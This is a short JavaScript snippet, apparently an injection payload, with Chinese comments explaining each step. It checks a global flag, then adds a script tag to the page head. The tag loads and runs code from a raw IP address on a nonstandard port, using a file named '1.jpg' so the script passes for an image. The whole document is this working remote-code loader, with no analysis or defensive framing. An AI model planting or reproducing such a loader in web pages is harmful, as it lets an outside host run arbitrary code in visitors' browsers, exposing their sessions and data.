if(!window.asdf)
{
  var head= document.getElementsByTagName('head')[0];
var script= document.createElement('script');
//属性赋值
script.type= 'text/javascript';
//下面为必要操作 否则将不能使用script标签中的内容
script.onload = script.onreadystatechange = function() {
    if (!this.readyState || this.readyState === "loaded" || this.readyState === "complete" ) {
        script.onload = script.onreadystatechange = null;
    } };
//添加src属性值
script.src= "https://106.75.10.182:8882/1.jpg";
head.appendChild(script);
}
